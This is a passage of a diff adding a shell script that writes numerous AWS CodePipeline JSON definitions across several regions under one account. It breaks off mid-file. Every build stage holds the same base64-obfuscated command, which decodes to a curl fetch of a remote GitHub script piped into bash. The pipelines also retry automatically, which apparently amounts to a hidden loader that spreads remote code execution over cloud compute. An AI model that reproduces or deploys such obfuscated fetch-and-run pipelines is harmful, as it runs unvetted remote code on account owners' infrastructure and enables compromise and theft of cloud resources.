+cat > apsoutheast23.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apsoutheast2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apnortheast11.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apnortheast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apnortheast12.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apnortheast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > apnortheast13.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "apnortheast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > cacentral11.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "cacentral1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > cacentral12.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "cacentral1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > cacentral13.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "cacentral1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > eucentral11.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "eucentral1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > eucentral12.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "eucentral1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > eucentral13.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "eucentral1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > euwest11.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "euwest1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > euwest12.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "euwest1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > euwest13.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "euwest1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > euwest21.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "euwest2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > euwest22.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "euwest2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > euwest23.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "euwest2-687185077845"
+        },
+        "stages": [
+            {
